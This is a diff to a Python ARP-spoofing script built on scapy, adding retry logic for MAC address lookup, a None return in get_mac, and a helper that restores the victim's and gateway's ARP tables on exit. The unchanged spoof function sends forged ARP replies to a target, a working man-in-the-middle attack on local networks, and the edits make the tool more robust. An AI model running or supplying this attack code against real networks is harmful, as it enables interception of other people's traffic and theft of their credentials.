@@ -14,6 +14,17 @@ def setup():
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    counter_retry = 0
+    while target_mac == None and counter_retry < 10:
+        print(f"[+]Retrying {counter_retry + 1}...")
+        counter_retry+= 1
+        target_mac = get_mac(target_ip)
+
+
+    if not target_mac:
+        print("[-]MAC cannot be founded. Exigint now")
+        restore_tables(target_ip, spoof_ip)
+        sys.exit()
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -23,8 +34,9 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
     if len(answered_list) == 0:
-        print("MAC address not found")
-        sys.exit()
+        print("\n[-]MAC address not found: ")
+        return None
+        
     return (answered_list[0][1].hwsrc)
 
 def restore(destination_ip, source_ip):
@@ -33,6 +45,11 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
+def restore_tables(target_ip, gateway_ip):
+    print("\n[+] Quitting due to interrupt. Resetting ARP tables, please wait...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("[+] Network back to default settings.")
 
 (options, arguments), parser = setup()
 target_ip = options.target_ip
